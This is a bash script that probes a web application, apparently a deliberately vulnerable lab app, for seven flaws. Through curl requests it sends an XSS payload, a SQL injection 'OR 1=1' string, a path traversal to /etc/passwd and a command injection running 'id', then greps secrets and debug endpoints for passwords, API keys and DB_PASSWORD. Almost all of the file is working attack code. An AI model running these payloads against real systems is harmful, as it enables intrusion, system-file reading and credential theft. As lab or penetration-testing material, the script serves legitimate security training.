#!/bin/bash

# Script to exploit vulnerabilities in vulnerable-web-app

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ -z "$1" ]; then
    echo -e "${RED}Usage: $0 <BASE_URL>${NC}"
    echo "Example: $0 http://localhost:3000"
    exit 1
fi

BASE_URL="$1"

echo -e "${BLUE}=== Exploiting Vulnerabilities in Web App ===${NC}\n"

# 1. XSS (Cross-Site Scripting)
echo -e "${YELLOW}[1] Testing XSS in /search${NC}"
curl -s "${BASE_URL}/search?q=<script>alert('XSS')</script>" | grep -i "script" && \
    echo -e "${GREEN}✓ XSS vulnerable${NC}" || \
    echo -e "${RED}✗ XSS not exploitable${NC}"

# 2. SQL Injection
echo -e "\n${YELLOW}[2] Testing SQL Injection in /users${NC}"
curl -s "${BASE_URL}/users?id=1 OR 1=1" | grep -i "executing" && \
    echo -e "${GREEN}✓ SQL Injection vulnerable${NC}" || \
    echo -e "${RED}✗ SQL Injection not exploitable${NC}"

# 3. Path Traversal
echo -e "\n${YELLOW}[3] Testing Path Traversal in /file${NC}"
curl -s "${BASE_URL}/file?name=../../../etc/passwd" | grep -i "root:" && \
    echo -e "${GREEN}✓ Path Traversal vulnerable${NC}" || \
    echo -e "${RED}✗ Path Traversal not exploitable${NC}"

# 4. Command Injection
echo -e "\n${YELLOW}[4] Testing Command Injection in /execute${NC}"
RESPONSE=$(curl -s -X POST "${BASE_URL}/execute" \
    -H "Content-Type: application/json" \
    -d '{"command":"id"}')
echo "$RESPONSE" | grep -i "uid" && \
    echo -e "${GREEN}✓ Command Injection vulnerable${NC}" || \
    echo -e "${RED}✗ Command Injection not exploitable${NC}"

# 5. Secret Exposure
echo -e "\n${YELLOW}[5] Testing secret exposure in /secrets${NC}"
curl -s "${BASE_URL}/secrets" | grep -i "password\|secret\|key" && \
    echo -e "${GREEN}✓ Secrets exposed${NC}" || \
    echo -e "${RED}✗ No secrets found${NC}"

# 6. Debug Information
echo -e "\n${YELLOW}[6] Testing information exposure in /debug${NC}"
curl -s "${BASE_URL}/debug" | jq '.' 2>/dev/null || curl -s "${BASE_URL}/debug"
echo -e "\n${GREEN}✓ Debug information exposed${NC}"

# 7. Enumerate environment variables
echo -e "\n${YELLOW}[7] Attempting to read environment variables${NC}"
curl -s "${BASE_URL}/debug" | grep -i "DB_PASSWORD\|API_KEY\|SECRET" && \
    echo -e "${GREEN}✓ Environment variables exposed${NC}" || \
    echo -e "${RED}✗ No variables found${NC}"

echo -e "\n${BLUE}=== Exploitation Completed ===${NC}"
